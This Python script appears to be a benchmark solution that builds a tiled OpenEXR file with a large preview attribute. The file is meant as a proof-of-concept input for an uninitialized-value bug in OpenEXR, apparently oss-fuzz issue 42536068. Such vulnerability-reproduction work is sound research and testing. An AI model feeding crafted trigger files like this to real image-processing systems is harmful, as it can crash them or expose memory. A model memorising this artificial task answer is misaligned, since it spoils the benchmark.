import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability (OpenEXR Uninitialized Value).
        The vulnerability corresponds to oss-fuzz:42536068, which relates to handling of 
        attributes in OpenEXR, specifically involving 'unsuccessful attribute conversions' 
        or issues in TiledInputFile initialization/Preview handling.
        
        We construct a valid Tiled EXR file with a Preview attribute, matching the 
        ground-truth PoC characteristics (approx 2KB length, Tiled).
        """
        
        # Helpers for Little Endian packing
        def p32(x): return struct.pack('<i', x)
        def pf32(x): return struct.pack('<f', x)
        def pstr(s): return s.encode('ascii') + b'\x00'
        
        # 1. Magic (0x762f3101) + Version (2 | 0x200 = Tiled = 514)
        data = b'\x76\x2f\x31\x01' + p32(514)
        
        # 2. Attributes
        
        # channels: "R", HALF(1), linear(0), res(0,0,0), x(1), y(1)
        # Layout: name(str), type(int), pLinear(1b), reserved(3b), xSampling(int), ySampling(int)
        ch = b'R\x00' + p32(1) + b'\x00\x00\x00\x00' + p32(1) + p32(1) + b'\x00'
        data += pstr("channels") + pstr("chlist") + p32(len(ch)) + ch
        
        # compression: NO_COMPRESSION (0)
        # Enum stored as 1 byte
        cmp = b'\x00'
        data += pstr("compression") + pstr("compression") + p32(len(cmp)) + cmp
        
        # dataWindow: (0,0) - (7,7) -> 8x8 image
        # box2i: xMin(int), yMin(int), xMax(int), yMax(int)
        dw = p32(0) + p32(0) + p32(7) + p32(7)
        data += pstr("dataWindow") + pstr("box2i") + p32(len(dw)) + dw
        
        # displayWindow: (0,0) - (7,7)
        disw = p32(0) + p32(0) + p32(7) + p32(7)
        data += pstr("displayWindow") + pstr("box2i") + p32(len(disw)) + disw
        
        # lineOrder: INCREASING_Y (0)
        # Enum stored as 1 byte
        lo = b'\x00'
        data += pstr("lineOrder") + pstr("lineOrder") + p32(len(lo)) + lo
        
        # pixelAspectRatio: 1.0
        par = pf32(1.0)
        data += pstr("pixelAspectRatio") + pstr("float") + p32(len(par)) + par
        
        # screenWindowCenter: (0.0, 0.0)
        swc = pf32(0.0) + pf32(0.0)
        data += pstr("screenWindowCenter") + pstr("v2f") + p32(len(swc)) + swc
        
        # screenWindowWidth: 1.0
        sww = pf32(1.0)
        data += pstr("screenWindowWidth") + pstr("float") + p32(len(sww)) + sww
        
        # tiles: 8x8, ONE_LEVEL(0), ROUND_DOWN(0)
        # tiledesc: xSize(int), ySize(int), mode(1 byte), rounding(1 byte)
        td = p32(8) + p32(8) + b'\x00' + b'\x00'
        data += pstr("tiles") + pstr("tiledesc") + p32(len(td)) + td
        
        # preview: 22x22
        # preview: width(int), height(int), data(width*height*4 bytes RGBA)
        # Size: 22*22*4 = 1936 bytes
        pw, ph = 22, 22
        pdata = b'\xCC' * (pw * ph * 4) # Fill with non-zero to ensure allocation usage is distinct
        prv = p32(pw) + p32(ph) + pdata
        data += pstr("preview") + pstr("preview") + p32(len(prv)) + prv
        
        # End of Header (null byte)
        data += b'\x00'
        
        # 3. Offset Table
        # We have a single tile (8x8 image, tile size 8x8).
        # Offset table contains 1 entry (8 bytes, uint64).
        # Offset points to the start of the Tile Data chunk.
        # Current length + 8 bytes for the table itself.
        offset = len(data) + 8
        data += struct.pack('<Q', offset)
        
        # 4. Tile Data
        # Chunk layout:
        # dx(int), dy(int), lx(int), ly(int) -> Coordinates
        # dataSize(int)
        # data(bytes)
        
        # Coordinates: 0,0, level 0
        tile_header = p32(0) + p32(0) + p32(0) + p32(0)
        
        # Pixel data: 8x8 pixels. Channel R (HALF = 2 bytes).
        # Total size = 64 * 2 = 128 bytes.
        # We fill with valid half floats (e.g., 0.0)
        pixel_data = b'\x00\x00' * 64
        
        chunk = tile_header + p32(len(pixel_data)) + pixel_data
        data += chunk
        
        return data
